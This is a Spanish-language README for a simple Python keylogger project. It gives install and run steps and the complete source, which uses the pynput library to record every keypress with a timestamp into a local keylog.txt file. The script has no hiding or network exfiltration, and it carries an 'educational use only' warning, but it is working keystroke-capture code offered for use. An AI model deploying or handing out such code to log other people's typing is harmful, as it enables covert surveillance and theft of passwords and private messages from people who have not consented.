## Basic Python Keylogger

Este es un simple keylogger implementado en Python que registra las teclas presionadas junto con la marca de tiempo correspondiente.

## Características

- Registra todas las teclas presionadas
- Guarda la fecha y hora de cada pulsación
- Almacena los registros en un archivo de texto
- Captura tanto caracteres imprimibles como teclas especiales

## Requisitos

- Python 3.10
- pynput

## Instalación

1. Asegúrate de tener Python instalado en tu sistema
2. Instala la dependencia necesaria:

```bash
pip install pynput
```

## Uso

1. Ejecuta el script:

```bash
python keylogger.py
```

2. El programa comenzará a registrar todas las teclas presionadas
3. Los registros se guardarán en un archivo llamado `keylog.txt` en el mismo directorio

## Estructura del Código

```python
from pynput.keyboard import Key, Listener
from datetime import datetime

# Función que registra cada tecla presionada
def on_press(key):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')  # Fecha y hora actual
    try:
        # Si es un carácter imprimible, lo guarda como tal
        with open("keylog.txt", "a") as file:
            file.write(f"{timestamp} - {key.char}\n")
    except AttributeError:
        # Si es una tecla especial, la guarda como Key.<nombre>
        with open("keylog.txt", "a") as file:
            file.write(f"{timestamp} - {key}\n")

# Inicializa el listener para capturar las teclas
with Listener(on_press=on_press) as listener:
    listener.join()
```

## Formato del Archivo de Salida

El archivo `keylog.txt` contendrá registros en el siguiente formato:

```
2025-01-10 14:30:45 - a
2025-01-10 14:30:46 - b
2025-01-10 14:30:47 - Key.space
```

## Advertencia

Este código es solo para fines educativos y de demostración. El uso de keyloggers sin el consentimiento explícito puede ser ilegal en muchas jurisdicciones.

## Contribuir

Siéntete libre de contribuir al proyecto mediante pull requests o reportando issues.

## Licencia

Este proyecto está licenciado bajo la Licencia MIT - ver el archivo LICENSE para más detalles.
